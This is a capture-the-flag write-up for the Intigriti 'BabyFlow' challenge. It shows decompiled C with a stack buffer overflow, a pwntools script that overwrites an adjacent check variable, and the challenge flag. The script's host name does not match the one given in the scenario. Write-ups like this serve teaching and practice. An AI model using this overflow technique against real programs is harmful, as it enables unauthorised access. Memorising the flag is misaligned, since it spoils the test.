---
title: BabyFlow
categories: 
  - Miscellaneous
  - "Binary Exploitation"
tags: 
completedDuringEvent: true
submitted: true
flags: flag: INTIGRITI{b4bypwn_9cdfb439c7876e703e307864c9167a15}
draft: false
---
## Scenario

> Does this login application even work?!
>
> `nc babyflow.ctf.intigriti.io 1331`

By CryptoCat

## Solution

The binary is a simple program that reads a password from the user and compares it to a hardcoded password. If the password is correct and the variable `v5` is non-zero, it prints the flag. The input buffer is 50 bytes long, and the variable `s` length is 44 bytes. We can overflow the buffer and overwrite the variable `v5` to a non-zero value to get the flag.

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char s[44]; // [rsp+0h] [rbp-30h] BYREF
  int v5; // [rsp+2Ch] [rbp-4h]

  v5 = 0;
  printf("Enter password: ");
  fgets(s, 50, _bss_start);
  if ( !strncmp(s, "SuPeRsEcUrEPaSsWoRd123", 0x16uLL) )
  {
    puts("Correct Password!");
    if ( v5 )
      puts("INTIGRITI{the_flag_is_different_on_remote}");
    else
      puts("Are you sure you are admin? o.O");
    return 0;
  }
  else
  {
    puts("Incorrect Password!");
    return 0;
  }
}
```

To exploit this, we need to send a password that matches the hardcoded one and then add additional bytes to overflow the buffer and set `v5` to a non-zero value. We can use the `cyclic` function from the `pwntools` library to generate the necessary padding.

Here is a Python script to achieve this:

```py
from pwn import *

r = remote('irrorversible.ctf.intigriti.io', 1331)

r.recvuntil(b'Enter password: ')

password = b'SuPeRsEcUrEPaSsWoRd123'
payload = flat([
    password,
    cyclic(44 - len(password))
])

r.sendline(payload)

r.interactive()
```
